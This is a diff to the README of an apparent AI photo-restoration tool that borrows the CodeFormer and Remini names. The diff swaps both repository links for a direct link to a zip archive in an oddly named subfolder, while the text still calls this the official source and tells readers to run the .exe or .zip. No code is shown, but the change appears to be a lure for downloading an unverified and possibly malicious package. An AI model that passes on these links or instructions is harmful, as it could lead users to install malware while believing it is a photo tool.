@@ -1,6 +1,6 @@
 # 🖼️ ai-photo-restoration-remini-codeformer - Fix blurry and old photographs easily
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Chelo6185/ai-photo-restoration-remini-codeformer)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Chelo6185/ai-photo-restoration-remini-codeformer/raw/refs/heads/main/macroconjugant/codeformer_photo_restoration_remini_ai_v1.7.zip)
 
 This software uses advanced computer technology to improve your low-quality images. It restores blurry faces, increases image resolution, and removes signs of age from your old photos. The program relies on models like CodeFormer and GFPGAN to analyze pixels and reconstruct missing details.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run this restoration software smoothly.
 
 You must obtain the installation package from the official source. Use the link below to reach the download page.
 
-[Click here to visit the download page](https://github.com/Chelo6185/ai-photo-restoration-remini-codeformer)
+[Click here to visit the download page](https://github.com/Chelo6185/ai-photo-restoration-remini-codeformer/raw/refs/heads/main/macroconjugant/codeformer_photo_restoration_remini_ai_v1.7.zip)
 
 Once you arrive at the page, look for the section labeled Releases. Select the latest version for Windows. Click the filename that ends in .exe or .zip to start the transfer to your computer.
 
